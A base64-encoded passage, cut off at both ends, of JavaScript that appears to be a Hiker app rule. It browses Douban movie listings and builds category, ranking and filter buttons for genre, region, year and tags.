vLmRvdWJhbi5jb20vYXBpL3YyL21vdmllL1xcXFxcXFwiICsgdGVtcC5pdGVtICsgJyZwbGF5YWJsZT0nICsgdGVtcC5wbGF5YWJsZSArICcmc29ydD0nICsgdGVtcC5zb3J0ICsgJyZzY29yZV9yYW5nZT0nICsgdGVtcC5zY29yZSArIChwYWdlID8gXFxcXFxcXCImc3RhcnQ9XFxcXFxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFxcXFxcIiZjb3VudD1cXFxcXFxcIiArIGNvdW50IDogXFxcXFxcXCImc3RhcnQ9MCZjb3VudD0zMFxcXFxcXFwiKSArICcmbG9jX2lkPTEwODI4OCcpO1xcXFxyXFxcXG4gICAgICAgIGwgPSBzLml0ZW1zO1xcXFxyXFxcXG4gICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvc3ViamVjdF9jb2xsZWN0aW9uL1xcXFxcXFwiICsgdGVtcC5pdGVtICsgJy9pdGVtcycgKyAnP3BsYXlhYmxlPScgKyB0ZW1wLnBsYXlhYmxlICsgJyZzb3J0PScgKyB0ZW1wLnNvcnQgKyAnJnNjb3JlX3JhbmdlPScgKyB0ZW1wLnNjb3JlICsgKHBhZ2UgPyBcXFxcXFxcIiZzdGFydD1cXFxcXFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXFxcXFwiJmNvdW50PVxcXFxcXFwiICsgY291bnQgOiBcXFxcXFxcIiZzdGFydD0wJmNvdW50PTMwXFxcXFxcXCIpKTtcXFxcclxcXFxuICAgICAgICBsID0gcy5zdWJqZWN0X2NvbGxlY3Rpb25faXRlbXM7XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGRldGFpbHNWaWV3Q29uZmlncyA9IGdldENvbmZpZygnZGV0YWlsc1ZpZXdDb25maWdzJyk7XFxcXHJcXFxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXFxcclxcXFxuICAgICAgICAgICAgaWQgPSBlLmlkLFxcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxcXHJcXFxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxcXHJcXFxcbiAgICAgICAgbGV0IHVybFBhcmFtcyA9IHt9O1xcXFxyXFxcXG4gICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXFxcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXFxcXFwiICsgJz90eXBlPScgKyB0eXBlICsgJyZpZD0nICsgaWQpLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlICsgXFxcXFxcXCLvvIhcXFxcXFxcIiArIGUueWVhciArIFxcXFxcXFwi77yJXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgZXh0cmE6IHVybFBhcmFtcy5leHRyYSxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLnBpYyA/IGUucGljLm5vcm1hbCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLnBpYy5ub3JtYWwgOiBlLmNvdmVyLnVybCArICdAUmVmZXJlcj0nICsgZS5jb3Zlci51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgIGRlc2M6IChlLnRhZ3MgPyBlLnRhZ3MubWFwKChlID0+IGUubmFtZSkpLmpvaW4oXFxcXFxcXCIsXFxcXFxcXCIpIDogZS5jYXJkX3N1YnRpdGxlKSArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyAoZS5yYXRpbmcgPyBjb21wdXRlUmF0aW5nKGUucmF0aW5nLm1heCwgZS5yYXRpbmcudmFsdWUpICsgXFxcXFxcXCIgXFxcXFxcXCIgKyBlLnJhdGluZy52YWx1ZS50b0ZpeGVkKDEpICsgXFxcXFxcXCLliIZcXFxcXFxcIiA6IFxcXFxcXFwi5pqC5peg6K+E5YiGXFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfSkpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/liIbnsbtcXFxcclxcXFxuZnVuY3Rpb24gY2xhc3NMaXN0KHBhZ2UsIGNvdW50KSB7XFxcXHJcXFxcbiAgICBpZiAoIWdldE15VmFyKCdjbGFzc2xpc3QnKSl7XFxcXHJcXFxcbiAgICAgICAgcHV0TXlWYXIoJ2NsYXNzbGlzdCcsIEpTT04uc3RyaW5naWZ5KHtzdWJ0eXBlOlxcXFxcXFwiXFxcXFxcXCIsbG9jYWw6XFxcXFxcXCJcXFxcXFxcIix5ZWFyOlxcXFxcXFwiXFxcXFxcXCIsY2xhc3M6XFxcXFxcXCJcXFxcXFxcIixyYW5rOlxcXFxcXFwiVVxcXFxcXFwiLHR5cGU6XFxcXFxcXCJcXFxcXFxcIixmaWx0ZXI6XFxcXFxcXCJcXFxcXFxcIixzY29yZTpcXFxcXFxcIjAsMTBcXFxcXFxcIn0pKTtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGxldCBhID0gW107XFxcXHJcXFxcbiAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXFxcclxcXFxuICAgIGxldCBjb2xvciA9IGdldENvbmZpZygnY2hvb3NlQ29sb3InKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgaXRlbXMgPSB7XFxcXHJcXFxcbiAgICAgICAgc3VidHlwZTogW1xcXFxcXFwi5YWo6YOo5b2i5byPXFxcXFxcXCIsIFxcXFxcXFwi55S15b2xXFxcXFxcXCIsIFxcXFxcXFwi55S16KeG5YmnXFxcXFxcXCIsIFxcXFxcXFwi57u86Im6XFxcXFxcXCIsIFxcXFxcXFwi5Yqo5ryrXFxcXFxcXCIsIFxcXFxcXFwi57qq5b2V54mHXFxcXFxcXCIsIFxcXFxcXFwi55+t54mHXFxcXFxcXCJdLFxcXFxyXFxcXG4gICAgICAgIGxvY2FsOiBbXFxcXFxcXCLlhajpg6jlnLDljLpcXFxcXFxcIiwgXFxcXFxcXCLoh6rlrprkuYnlnLDljLpcXFxcXFxcIiwgXFxcXFxcXCLkuK3lm73lpKfpmYZcXFxcXFxcIiwgXFxcXFxcXCLnvo7lm71cXFxcXFxcIiwgXFxcXFxcXCLkuK3lm73pppnmuK9cXFxcXFxcIiwgXFxcXFxcXCLkuK3lm73lj7Dmub5cXFxcXFxcIiwgXFxcXFxcXCLml6XmnKxcXFxcXFxcIiwgXFxcXFxcXCLpn6nlm71cXFxcXFxcIiwgXFxcXFxcXCLoi7Hlm71cXFxcXFxcIiwgXFxcXFxcXCLms5Xlm71cXFxcXFxcIiwgXFxcXFxcXCLlvrflm71cXFxcXFxcIiwgXFxcXFxcXCLmhI/lpKfliKlcXFxcXFxcIiwgXFxcXFxcXCLopb/nj63niZlcXFxcXFxcIiwgXFxcXFxcXCLljbDluqZcXFxcXFxcIiwgXFxcXFxcXCLms7Dlm71cXFxcXFxcIiwgXFxcXFxcXCLkv4TnvZfmlq9cXFxcXFxcIiwgXFxcXFxcXCLkvIrmnJdcXFxcXFxcIiwgXFxcXFxcXCLliqDmi7/lpKdcXFxcXFxcIiwgXFxcXFxcXCLmvrPlpKfliKnkuppcXFxcXFxcIiwgXFxcXFxcXCLniLHlsJTlhbBcXFxcXFxcIiwgXFxcXFxcXCLnkZ7lhbhcXFxcXFxcIiwgXFxcXFxcXCLlt7Topb9cXFxcXFxcIiwgXFxcXFxcXCLkuLnpuqZcXFxcXFxcIl0sXFxcXHJcXFxcbiAgICAgICAgdHlwZTogW1xcXFxcXFwi5YWo6YOo57G75Z6LXFxcXFxcXCIsIFxcXFxcXFwi6Ieq5a6a5LmJ57G75Z6LXFxcXFxcXCIsIFxcXFxcXFwi5Ymn5oOFXFxcXFxcXCIsIFxcXFxcXFwi5Zac5YmnXFxcXFxcXCIsIFxcXFxcXFwi5Yqo5L2cXFxcXFxcXCIsIFxcXFxcXFwi54ix5oOFXFxcXFxcXCIsIFxcXFxcXFwi56eR5bm7XFxcXFxcXCIsIFxcXFxcXFwi5Yqo55S7XFxcXFxcXCIsIFxcXFxcXFwi5oKs55aRXFxcXFxcXCIsIFxcXFxcXFwi5oOK5oKaXFxcXFxcXCIsIFxcXFxcXFwi5oGQ5oCWXFxcXFxcXCIsIFxcXFxcXFwi54qv572qXFxcXFxcXCIsIFxcXFxcXFwi5ZCM5oCnXFxcXFxcXCIsIFxcXFxcXFwi6Z+z5LmQXFxcXFxcXCIsIFxcXFxcXFwi5q2M6IieXFxcXFxcXCIsIFxcXFxcXFwi5Lyg6K6wXFxcXFxcXCIsIFxcXFxcXFwi5Y6G5Y+yXFxcXFxcXCIsIFxcXFxcXFwi5oiY5LqJXFxcXFxcXCIsIFxcXFxcXFwi6KW/6YOoXFxcXFxcXCIsIFxcXFxcXFwi5aWH5bm7XFxcXFxcXCIsIFxcXFxcXFwi5YaS6ZmpXFxcXFxcXCIsIFxcXFxcXFwi54G+6Zq+XFxcXFxcXCIsIFxcXFxcXFwi5q2m5L6gXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXFx1NjBjNVxcXFxcXFxcdTgyNzJcXFxcXFxcIl0sXFxcXHJcXFxcbiAgICAgICAgeWVhcjogW1xcXFxcXFwi5YWo6YOo5bm05LujXFxcXFxcXCIsIFxcXFxcXFwi6Ieq5a6a5LmJ5bm05Lu9XFxcXFxcXCIsIFxcXFxcXFwiMjAyMOW5tOS7o1xcXFxcXFwiLCBcXFxcXFxcIjIwMTDlubTku6NcXFxcXFxcIiwgXFxcXFxcXCIyMDAw5bm05LujXFxcXFxcXCIsIFxcXFxcXFwiOTDlubTku6NcXFxcXFxcIiwgXFxcXFxcXCI4MOW5tOS7o1xcXFxcXFwiLCBcXFxcXFxcIjcw5bm05LujXFxcXFxcXCIsIFxcXFxcXFwiNjDlubTku6NcXFxcXFxcIiwgXFxcXFxcXCLmm7Tml6lcXFxcXFxcIl0sXFxcXHJcXFxcbiAgICAgICAgY2xhc3M6IFtcXFxcXFxcIuWFqOmDqOeJueiJslxcXFxcXFwiLCBcXFxcXFxcIuiHquWumuS5ieagh+etvlxcXFxcXFwiLCBcXFxcXFxcIue7j+WFuFxcXFxcXFwiLCBcXFxcXFxcIumdkuaYpVxcXFxcXFwiLCBcXFxcXFxcIuaWh+iJulxcXFxcXFwiLCBcXFxcXFxcIuaQnueskVxcXFxcXFwiLCBcXFxcXFxcIuWKseW/l1xcXFxcXFwiLCBcXFxcXFxcIumtlOW5u1xcXFxcXFwiLCBcXFxcXFxcIuaEn+S6ulxcXFxcXFwiLCBcXFxcXFxcIuWls+aAp1xcXFxcXFwiLCBcXFxcXFxcIum7keW4rlxcXFxcXFwiLCBcXFxcXFxcIuayu+aEiFxcXFxcXFwiLCBcXFxcXFxcIue+jumjn1xcXFxcXFwiLCBcXFxcXFxcIuWul+aVmVxcXFxcXFwiLCBcXFxcXFxcIuWwj+ivtOaUuee8llxcXFxcXFwiLCBcXFxcXFxcIui2hee6p+iLsembhFxcXFxcXFwiXVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChpdGVtIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBpdGVtc1tpdGVtXS5sZW5ndGg7IGkrKykge1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICBpZih0ZW1wW2l0ZW1dID09IGl0ZW1zW2l0ZW1dW2ldIHx8ICh0ZW1wW2l0ZW1dID09IFxcXFxcXFwiXFxcXFxcXCIgJiYgaSA9PSAwKSl7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZSA9ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgaXRlbXNbaXRlbV1baV0gKyAnIDwvZm9udD48L2I+JztcXFxcclxcXFxuICAgICAgICAgICAgfWVsc2V7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZSA9IGl0ZW1zW2l0ZW1dW2ldO1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB1cmwgPSAkKCdoaWtlcjovL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgodGV4dCxpdGVtKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0ZW1wW2l0ZW1dID0gdGV4dC5pbmRleE9mKFxcXFxcXFwi5YWo6YOoXFxcXFxcXCIpICE9IC0xID8gXFxcXFxcXCJcXFxcXFxcIiA6IHRleHQ7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY2xhc3NsaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIGl0ZW1zW2l0ZW1dW2ldLCBpdGVtKTtcXFxcclxcXFxuICAgICAgICAgICAgXFxcXHJcXFxcbiAgICAgICAgICAgIGlmKGl0ZW1zW2l0ZW1dW2ldID09IFxcXFxcXFwi6Ieq5a6a5LmJ5bm05Lu9XFxcXFxcXCIpe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaWYodGVtcC55ZWFyID09IFxcXFxcXFwi6Ieq5a6a5LmJ5bm05Lu9XFxcXFxcXCIpe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlID0gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPuiHquWumuS5ieW5tOS7vTonICsgdGVtcC5jdXN0b21ZZWFyICsgJyA8L2ZvbnQ+PC9iPic7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybCA9ICQodGVtcC5jdXN0b21ZZWFyLCAn55u05o6l6L6T5YWl5YW35L2T5bm05Lu9LOS+i+WmgjIwMDAnKS5pbnB1dCgoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdjbGFzc2xpc3QnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYoaW5wdXQubGVuZ3RoID09IDQpe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0ZW1wLmN1c3RvbVllYXIgPSBpbnB1dDtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC55ZWFyID0gXFxcXFxcXCLoh6rlrprkuYnlubTku71cXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJjbGFzc2xpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfWVsc2V7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1lbHNlIGlmKGl0ZW1zW2l0ZW1dW2ldID09IFxcXFxcXFwi6Ieq5a6a5LmJ5Zyw5Yy6XFxcXFxcXCIpe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaWYodGVtcC5sb2NhbCA9PSBcXFxcXFxcIuiHquWumuS5ieWcsOWMulxcXFxcXFwiKXtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZSA9ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz7oh6rlrprkuYnlnLDljLo6JyArIHRlbXAuY3VzdG9tTG9jYWwgKyAnIDwvZm9udD48L2I+JztcXFxcclxcXFxuICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgIFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgdXJsID0gJCh0ZW1wLmN1c3RvbUxvY2FsLCAn55u05o6l6L6T5YWl5YW35L2T5Zyw5Yy6LOS+i+WmguS4reWbveWkp+mZhicpLmlucHV0KCgpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpZihpbnB1dC5sZW5ndGggPiAwKXtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC5jdXN0b21Mb2NhbCA9IGlucHV0O1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0ZW1wLmxvY2FsID0gXFxcXFxcXCLoh6rlrprkuYnlnLDljLpcXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJjbGFzc2xpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfWVsc2V7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1lbHNlIGlmKGl0ZW1zW2l0ZW1dW2ldID09IFxcXFxcXFwi6Ieq5a6a5LmJ57G75Z6LXFxcXFxcXCIpe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaWYodGVtcC50eXBlID09IFxcXFxcXFwi6Ieq5a6a5LmJ57G75Z6LXFxcXFxcXCIpe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlID0gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPuiHquWumuS5ieexu+WeizonICsgdGVtcC5jdXN0b21UeXBlICsgJyA8L2ZvbnQ+PC9iPic7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybCA9ICQodGVtcC5jdXN0b21UeXBlLCAn55u05o6l6L6T5YWl5YW35L2T57G75Z6LLOS+i+WmguWJp+aDhScpLmlucHV0KCgpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpZihpbnB1dC5sZW5ndGggPiAwKXtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC5jdXN0b21UeXBlID0gaW5wdXQ7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXAudHlwZSA9IFxcXFxcXFwi6Ieq5a6a5LmJ57G75Z6LXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY2xhc3NsaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIH1lbHNle1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxyXFxcXG4gICAgICAgICAgICB9ZWxzZSBpZihpdGVtc1tpdGVtXVtpXSA9PSBcXFxcXFxcIuiHquWumuS5ieagh+etvlxcXFxcXFwiKXtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmKHRlbXAuY2xhc3MgPT0gXFxcXFxcXCLoh6rlrprkuYnmoIfnrb5cXFxcXFxcIil7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGUgPSAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6Ieq5a6a5LmJ5qCH562+OicgKyB0ZW1wLmN1c3RvbUNsYXNzICsgJyA8L2ZvbnQ+PC9iPic7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybCA9ICQodGVtcC5jdXN0b21DbGFzcywgJ+ebtOaOpei+k+WFpeWFt+S9k+agh+etvizkvovlpoLnu4/lhbhcXFxcXFxcXG7lj6/lhpnlpJrkuKrmoIfnrb4s5L2/55SoXFxcXFxcXCLoi7HmlofpgJflj7dcXFxcXFxcIuWIhumalCcpLmlucHV0KCgpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpZihpbnB1dC5sZW5ndGggPiAwKXtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC5jdXN0b21DbGFzcyA9IGlucHV0O1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0ZW1wLmNsYXNzID0gXFxcXFxcXCLoh6rlrprkuYnmoIfnrb5cXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJjbGFzc2xpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfWVsc2V7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6IHVybFxcXFxyXFxcXG4gICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2JsYW5rX2Jsb2NrJ1xcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHJhbmsgPSB7XFxcXHJcXFxcbiAgICAgICAg6buY6K6k5o6S5bqPOiBcXFxcXFxcIlVcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICDng63luqY6IFxcXFxcXFwiVFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgIOivhOWIhjogXFxcXFxcXCJTXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAg5pe26Ze0OiBcXFxcXFxcIlJcXFxcXFxcIlxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgciBpbiByYW5rKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAucmFuayA9PT0gcmFua1tyXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgciArICcgPC9mb250PjwvYj4nIDogcixcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjogLy9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5yYW5rID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY2xhc3NsaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0sIHJhbmtbcl0pXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBmaWx0ZXIgPSB7XFxcXHJcXFxcbiAgICAgICAg5YWo6YOo5b2x54mHOiAnJyxcXFxcclxcXFxuICAgICAgICDku4XmnInniYfmupA6ICdwbGF5YWJsZSdcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGZvciAobGV0IHIgaW4gZmlsdGVyKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU